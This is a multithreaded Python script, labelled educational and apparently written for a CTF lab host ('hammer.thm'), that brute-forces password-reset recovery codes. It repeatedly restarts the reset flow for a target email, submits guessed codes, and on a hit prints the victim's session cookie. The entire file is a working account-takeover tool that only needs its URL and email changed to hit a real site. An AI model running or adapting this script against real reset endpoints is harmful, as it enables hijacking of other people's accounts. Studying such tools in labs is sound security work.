#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Reset Password Code Brute-Forcer
Author: Julián Rodríguez
Description:
  Script to brute-force recovery codes in multi-threaded mode.
  For educational purposes only. Use in controlled environments like CTFs or labs.
"""

import requests
import time
import threading
import sys

URL = "http://hammer.thm:1337/reset_password.php" # endpoint
EMAIL = "tester@hammer.thm"                       # email/user
CODES = ["1337", "1234", "0000", "4321", "9999"]  # Códigos a probar, 1 por hilo

HEADERS_TEMPLATE = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://hammer.thm:1337',
    'Referer': URL,
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}

found = threading.Event()  # Bandera global para detener los hilos cuando uno acierte

def iniciar_recuperacion(session, headers):
    try:
        data = { "email": EMAIL }
        r = session.post(URL, headers=headers, data=data)
        return "Enter Recovery Code" in r.text
    except requests.RequestException as e:
        print(f"[!] Error en iniciar_recuperacion: {e}")
        return False

def enviar_codigo(session, headers, code):
    try:
        data = {
            "recovery_code": code,
            "s": "127"
        }
        return session.post(URL, headers=headers, data=data)
    except requests.RequestException as e:
        print(f"[!] Error en enviar_codigo: {e}")
        return None

def worker(code):
    while not found.is_set():
        session = requests.Session()
        headers = HEADERS_TEMPLATE.copy()

        print(f"[+] Hilo {code} → probando código: {code}")

        if not iniciar_recuperacion(session, headers):
            print(f"[-] Hilo {code} → fallo al iniciar recuperación.")
            continue

        r = enviar_codigo(session, headers, code)

        if r is None:
            continue

        if "Invalid or expired recovery code" not in r.text:
            print(f"\n[✅] Hilo {code} → ¡Código correcto encontrado! => {code}")
            print(f"[🍪] PHPSESSID: {session.cookies.get_dict().get('PHPSESSID', 'No encontrado')}")
            found.set()
            return
        else:
            print(f"[✗] Hilo {code} → Código incorrecto.")

        time.sleep(1.5)  # Delay entre reintentos

def main():
    threads = []

    for code in CODES:
        t = threading.Thread(target=worker, args=(code,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    if not found.is_set():
        print("[-] Ningún código fue válido.")

if __name__ == "__main__":
    main()
